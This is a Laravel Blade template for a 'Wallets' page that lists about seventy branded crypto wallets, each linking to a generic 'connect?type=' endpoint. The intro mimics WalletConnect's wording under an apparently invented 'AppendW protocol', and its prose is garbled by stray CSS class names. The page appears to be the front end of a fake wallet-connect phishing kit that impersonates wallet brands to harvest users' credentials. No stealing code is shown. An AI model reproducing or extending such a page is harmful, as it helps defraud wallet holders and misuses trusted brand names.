	        </ul>
	    </div>
	</nav>

   <div class="container-fluid py-5">
      <div class="container">

      	<h3 class="text-center mb-4">Wallets</h3>
      	<p class="text-center mb-5">
      		Multiple iOS and Android wallets support the AppendW protocol. Simply scan a QR code from your desktop computer screen to start securely using a dApp with your mobile wallet. Interaction between mobile col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4 and mobile browsers are supported via mobile deep linking.
      	</p>

      	<div class="row wallets">
      		<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
      			<a href="connect?type=metamask">
      				<img src="img/metamask.png" alt="MetaMask">
      			</a>
      			<br>
	      		<span>MetaMask</span>
      		</div>

      		<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
      			<a href="connect?type=mew+wallet">
      				<img src="img/mew.png" alt="Mew Wallet">
      			</a>
      			<br>
      			<span>Mew Wallet</span>
      		</div>

      		<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
      			<a href="connect?type=trustwallet">
      				<img src="img/trustwallet.png" alt="Trust wallet">
      			</a>
      			<br>
	      		<span>Trust wallet</span>
      		</div>

      		<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
      			<a href="connect?type=wallet+connect">
      				<img src="img/logo.svg" alt="Wallet connect">
      			</a>
      			<br>
      			<span>Wallet Connect</span>
      		</div>

      		<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
      			<a href="connect?type=coinbase">
      				<img src="img/coinbase.jpg" alt="Coinbase">
      			</a>
      			<br>
	      		<span>Coinbase</span>
      		</div>

      		<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
      			<a href="connect?type=atomic">
      				<img src="img/atomic.png" alt="Atomic">
      			</a>
      			<br>
	      		<span>Atomic</span>
      		</div>

      		<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
      			<a href="connect?type=binance">
      				<img src="img/binance.png" alt="Binance">
      			</a>
      			<br>
	      		<span>Binance</span>
      		</div>

      		<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
      			<a href="connect?type=bnb">
      				<img src="img/bnb.png" alt="BNB">
      			</a>
      			<br>
	      		<span>Binance</span>
      		</div>

      		<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
      			<a href="connect?type=polkadot">
      				<img src="img/polkadot.png" alt="Polkadot">
      			</a>
      			<br>
	      		<span>Polkadot</span>
      		</div>

      		<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
      			<a href="connect?type=xrp">
      				<img src="img/xrp.png" class="card-img-top" alt="XRP">
      			</a>
      			<span>XRP</span>
      		</div>

      		<div class="col col-sm-4 col-md-3 col-lg-1 shadow rounded mr-3 mb-4 ">
      			<a href="connect?type=stellar" class="d-block mb-2">
      				<img src="img/stellar.png" alt="Stellar">
      			</a>
      			<span>Stellar</span>
      		</div>

      		<div class="col col-sm-4 col-md-3 col-lg-1 shadow rounded mr-3 mb-4">
      			<a href="connect?type=tezos">
      				<img src="img/tezos.png" alt="Tezos">
      			</a>
      			<span>Tezos</span>
      		</div>

      		<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
      			<a href="connect?type=theta">
      				<img src="img/theta.png" alt="Theta">
      			</a>
      			<span>Theta</span>
      		</div>

      		<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
      			<a href="connect?type=tron">
      				<img src="img/tron.png" class="card-img-top" alt="Tron">
      			</a>
      			<br>
	      		<span>Tron</span>
      		</div>

      		<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
      			<a href="connect?type=cosmos">
      				<img src="img/cosmos.png" class="card-img-top" alt="Cosmos">
      			</a>
      			<br>
	      		<span>Cosmos</span>
      		</div>

      		<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
      			<a href="connect?type=kova">
      				<img src="img/kava.png" class="card-img-top" alt="Kava">
      			</a>
      			<br>
	      		<span>Kava</span>
      		</div>

      		<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
      			<a href="connect?type=filecoin">
      				<img src="img/filecoin.png" alt="Filecoin">
      			</a>
      			<br>
	      		<span>Filecoin</span>
      		</div>

      		<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
      			<a href="connect?type=solana">
      				<img src="img/solana.png" class="card-img-top" alt="Solana">
      			</a>
      			<br>
	      		<span>Solana</span>
      		</div>

      		<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
      			<a href="connect?type=Etherium+Classic">
      				<img src="img/ethereum-classic.png" class="card-img-top" alt="Etherium Classic">
      			</a>
      			<br>
	      		<span>Etherium Classic</span>
      		</div>

      		<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
      			<a href="connect?type=zilliqa">
      				<img src="img/zilliqa.png" class="card-img-top" alt="Zilliqa">
      			</a>
      			<br>
	      		<span>Zilliqa</span>
      		</div>

      		<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
      			<a href="connect?type=elrond">
      				<img src="img/elrond.jpg" class="card-img-top" alt="Elrond">
      			</a>
      			<br>
	      		<span>Elrond</span>
      		</div>

      		<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
      			<a href="connect?type=waves">
      				<img src="img/waves.png" class="card-img-top" alt="Waves">
      			</a>
      			<br>
	      		<span>Waves</span>
      		</div>

      		<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
      			<a href="connect?type=icon">
      				<img src="img/icon.png" class="card-img-top" alt="Icon">
      			</a>
      			<br>
	      		<span>Icon</span>
      		</div>

      		<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
      			<a href="connect?type=ontology">
      				<img src="img/ontology.png" class="card-img-top" alt="Ontology">
      			</a>
      			<br>
	      		<span>Ontology</span>
      		</div>

      		<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
				    <a href="connect?type=nano"><img src="img/nano.png"></a><br>
				    <span>Nano</span>
				</div>

				<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
				    <a href="connect?type=tomo+chain">
				    	<img src="img/tomo.png">
				    </a>
				    <br>
				    <span>Tomo Chain</span>
				</div>

				<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
				   <a href="connect?type=iotex">
				   	<img src="img/iotex.png"></a>
				   	<br>
				   <span>IoTex</span>
				</div>

	      	<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
				    <a href="connect?type=wanchain"><img src="img/wanchain.png"></a><br>
				    Wanchain
				</div>

				<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
				    <a href="connect?type=harmony"><img src="img/harmony.png"></a><br>
				    Harmony
				</div>

				<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
				    <a href="connect?type=kin"><img src="img/kin.png"></a><br>
				    Kin
				</div>

      	</div>


      	<div class="row d-none wallets" id="moreContainer">

				<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
				   <a href="connect?type=nimiq"><img src="img/nimiq.png"></a><br>
				   <span>Nimiq</span>
				</div>

				<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
				   <a href="connect?type=aion"><img src="img/aion.png"></a><br>
				   <span>Aion</span>
				</div>

				<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
				   <a href="connect?type=thunder-token"><img src="img/thundertoken.png"></a><br>
				   <span>Thunder Token</span>
				</div>

				<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
				   <a href="connect?type=aerternity"><img src="img/aeternity.png"></a><br>
				   <span>Aeternity</span>
				</div>

				<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
				   <a href="connect?type=nebulas"><img src="img/nebulas.png"></a><br>
				   <span>Nebulas</span>
				</div>

				<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
				   <a href="connect?type=fio"><img src="img/fio.png"></a><br>
				   <span>FIO</span>
				</div>

				<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
				   <a href="connect?type=gochain"><img src="img/gochain.png"></a><br>
				    <span>GoChain</span>
				</div>

				<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
				   <a href="connect?type=POA+network"><img src="img/poa.png"></a><br>
				   <span>POA Network</span>
				</div>

				<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
				   <a href="connect?type=callisto"><img src="img/callisto.png"></a><br>
				   <span>Callisto</span>
				</div>

				<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
				   <a href="connect?type=bitpay"><img src="img/bitpay.jpg"></a><br>
				   <span>BitPay</span>
				</div>

				<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
				   <a href="connect?type=aktionariat"><img src="img/aktionariat.png"></a><br>
				   <span>Aktionariat</span>
				</div>

				<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
				   <a href="connect?type=atwallet"><img src="img/atwallet.png"></a><br>
				   <span>AtWallet</span>
				</div>

				<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
				    <a href="connect?type=guard+wallet"><img src="img/guard.png"></a><br>
				    Guard Wallet
				</div>

				<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
				   <a href="connect?type=aave"><img src="img/aave.jpg"></a><br>
				   <span>AAVE</span>
				</div>

				<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
				    <a href="connect?type=exodus"><img src="img/exodus.jpg"></a><br>
				    Exodus
				</div>


				<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
				   <a href="connect?type=enjin"><img src="img/enjin.jpg"></a><br>
				   <span>Enjin</span>
				</div>


				<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
				   <a href="connect?type=skale"><img src="img/skale.png"></a><br>
				   <span>Skale</span>
				</div>

				<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
				   <a href="connect?type=portis"><img src="img/portis.png"></a><br>
				   <span>Portis</span>
				</div>

				<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
				   <a href="connect?type=trezor"><img src="img/trezor.jpg"></a><br>
				   <span>Trezor</span>
				</div>

				<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
				   <a href="connect?type=squarelink"><img src="img/squarelink.png"></a><br>
				   <span>Squarelink</span>
				</div>

				<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
				   <a href="connect?type=torus"><img src="img/torus.jpg"></a><br>
				   <span>Torus</span>
				</div>

				<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
				    <a href="connect?type=vechain"><img src="img/vechain.jpg"></a><br>
				   <span>VeChain</span>
				</div>

				<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
				   <a href="connect?type=scatter+wallet"><img src="img/scatter.jpg"></a><br>
				   <span>Scatter Wallet</span>
				</div>

				<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
				   <a href="connect?type=math+wallet"><img src="img/math-wallet.png"></a><br>
				   <span>Math Wallet</span>
				</div>

				<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
				   <a href="connect?type=fortmatic"><img src="img/fortmatic.png"></a><br>
				   <span>FortMatic</span>
				</div>

				<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
				   <a href="connect?type=digitex"><img src="img/digitex.png"></a><br>
				   <span>Digitex</span>
				</div>

				<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
				   <a href="connect?type=ledger"><img src="img/ledger.png"></a><br>
				   <span>Ledger</span>
				</div>

				<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
				   <a href="connect?type=defiat"><img src="img/defiat.jpg"></a><br>
				   <span>Defiat</span>
				</div>

				<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
				   <a href="connect?type=authereum"><img src="img/authereum.png"></a><br>
				   <span>Authereum</span>
				</div>

				<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
				   <a href="connect?type=flare+wallet"><img src="img/flare.jpg"></a><br>
				   <span>Flare Wallet</span>
				</div>

				<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
				   <a href="connect?type=zelcore"><img src="img/zelcore.png"></a><br>
				   <span>Zelcore</span>
				</div>

				<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
				   <a href="connect?type=bitkeep"><img src="img/bitkeep.png"></a><br>
				   <span>BitKeep</span>
				</div>

				<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
				   <a href="connect?type=coin98"><img src="img/coin98.png"></a><br>
				   <span>Coin98</span>
				</div>

				<div class="col col-sm-4 col-md-3 col-lg-1 text-center shadow rounded mr-3 mb-4">
				   <a href="connect?type=trust+vault"><img src="img/trustvault.png"></a><br>
				   <span>Trust Vault</span>
				</div>
      	</div>

      	<div class="my-5 text-center">
      		<button class="btn btn-outline-info px-5 btn-more">Show more</button>
      	</div>

      </div>
   </div>
@endsection
